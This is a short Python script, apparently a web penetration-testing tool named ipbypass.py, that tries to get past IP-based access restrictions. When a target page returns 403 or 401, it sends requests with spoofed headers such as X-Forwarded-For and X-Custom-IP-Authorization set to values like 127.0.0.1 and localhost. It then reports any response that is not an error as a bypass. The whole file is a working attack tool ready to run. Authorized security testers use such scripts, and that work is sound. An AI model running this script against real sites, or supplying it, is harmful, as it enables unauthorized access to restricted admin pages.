# How to use it - python3 ./ipbypass.py http://monURL.com
# Testing all known bypass combination
# Get the server response : curl 'http://monURL.com --header 'X-Forwarded-For: 192.168.1.1'

import requests
import sys
import socket

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def IP_authorization_bypass(res, url, domain, page, word_exclude=False):
	# Ex: http://lpage.com/admin header="X-Custom-IP-Authorization": 127.0.0.1
	headers_type = [
	"X-Originating-IP", "X-Forwarded", "Forwarded", "Forwarded-For", "Forwarded-For-IP", "X-Forwarder-For", "X-Forwarded-For", "X-Forwarded-For-Original",
	"X-Forwarded-By", "X-Forwarded-Host", "X-Remote-IP", "X-Remote-Addr", "X-Client-IP", "Client-IP", "Access-Control-Allow-Origin", "Origin",
	"X-Custom-IP-Authorization",
	]
	try:
		website_ip = socket.gethostbyname(domain)
		ips_type  = [website_ip, "127.0.0.1", "*", "8.8.8.8", "null", "192.168.0.2", "10.0.0.1", "0.0.0.0", "localhost", "192.168.1.1"]
	except:
		ips_type  = ["127.0.0.1", "*", "8.8.8.8", "null", "192.168.0.2", "10.0.0.1", "localhost", "0.0.0.0", "192.168.1.1"]
	for h in headers_type:
		for ip in ips_type:
			header = {h : ip}
			req_ip = requests.get(res, verify=False, headers=header, allow_redirects=False)
			if word_exclude:
				if req_ip.status_code not in [403, 401, 404, 421, 429, 400, 408, 503, 405, 428, 412, 666, 500] and not word_exclude in req_ip.text:
					print("[{}] Restriction Bypass with: {}".format(req_ip.status_code, header, len(req_ip.content)))
			else:
				if req_ip.status_code not in [403, 401, 404, 421, 429, 400, 408, 503, 405, 428, 412, 666, 500]:
					print("[{}] Restriction Bypass with: {}".format(req_ip.status_code, header, len(req_ip.content)))
			sys.stdout.write("\033[34m[i] {}:{}\033[0m\r".format(h, ip))
			sys.stdout.write("\033[K")

def run_module(res):
	res_page = res.split("/")[3:] # get all after base url
	url_split = res.split("/")[:3]
	url = "/".join(url_split) + "/" # get just url
	page = "/".join(res_page) if len(res_page) > 1 else "".join(res_page)
	domain =  "/".join(res.split("/")[:3]) + "/"
	req_res = requests.get(res, verify=False)
	if req_res.status_code in [403, 401]:
		IP_authorization_bypass(res, url, domain, page)
	else:
		verif = input(" The page dosn't seem to be forbidden do you want continue ? [y:n] ")
		if verif in ["y","Y"]:
			word_exclude = input(" Please enter an exclude word to defined the page changement: ")
			IP_authorization_bypass(res, url, domain, page, word_exclude)
		else:
			sys.exit()

if __name__ == '__main__':
	res = sys.argv[1]
	run_module(res)
